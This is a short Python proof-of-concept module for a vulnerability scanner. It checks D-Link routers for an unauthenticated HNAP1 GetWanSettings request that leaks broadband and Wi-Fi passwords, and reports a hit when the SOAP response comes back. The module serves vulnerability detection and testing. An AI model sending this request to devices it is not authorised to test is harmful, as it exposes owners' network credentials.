# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'D-Link_0006' # 平台漏洞编号，留空
    name = 'D-Link发送特定POST包获取宽带帐号wifi等密码' # 漏洞名称
    level = VulnLevel.MED # 漏洞危害级别
    type = VulnType.OTHER # 漏洞类型
    disclosure_date = '2014-09-29'  # 漏洞公布时间
    desc = '''
       获取外网IP地址直接POST发包可以获取宽带帐号，wifi密码等信息。 
    ''' # 漏洞描述
    ref = 'https://wooyun.shuimugan.com/bug/view?bug_no=066906' # 漏洞来源
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown' #cve编号
    product = 'D-Link'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '2fbb95e7-3f84-4663-a4d1-78529b68d7d0'
    author = '国光'  # POC编写者
    create_date = '2018-05-13' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            header = 'SOAPAction: "http://purenetworks.com/HNAP1/GetWanSettings"'
            url = '{target}'.format(target=self.target)+"/HNAP1/"
            code, head, res, errcode, finalurl= hh.http(url,method='POST',header=header)
                       
            if code == 200 and "xmlns:soap" in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()